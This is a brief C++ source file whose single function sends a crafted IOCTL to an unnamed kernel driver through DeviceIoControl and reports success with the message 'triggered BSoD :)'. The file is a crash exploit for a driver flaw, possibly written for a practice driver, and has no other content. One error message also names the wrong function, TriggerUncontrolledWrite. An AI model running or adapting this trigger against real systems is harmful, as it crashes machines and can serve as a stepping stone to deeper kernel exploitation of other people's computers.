#include "ioctl.h"


BOOL IoctlTriggers::TriggerUnfilteredStatus(HANDLE DriverHandle) {
    ULONG DriverParams = 8;
    DWORD BytesReturned = 0;
    if (DriverHandle == NULL || DriverHandle == INVALID_HANDLE_VALUE) {
        printf("[-] TriggerUncontrolledWrite() failed - invalid parameters\n");
        return FALSE;
    }
    if (!DeviceIoControl(DriverHandle, UNFILTERED_STATUS_IOCTL, &DriverParams,
        DriverParams, &DriverParams, DriverParams, &BytesReturned, NULL)) {
        printf("[-] TriggerUnfilteredStatus() failed - %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] TriggerUnfilteredStatus() triggered BSoD :)\n");
    return TRUE;
}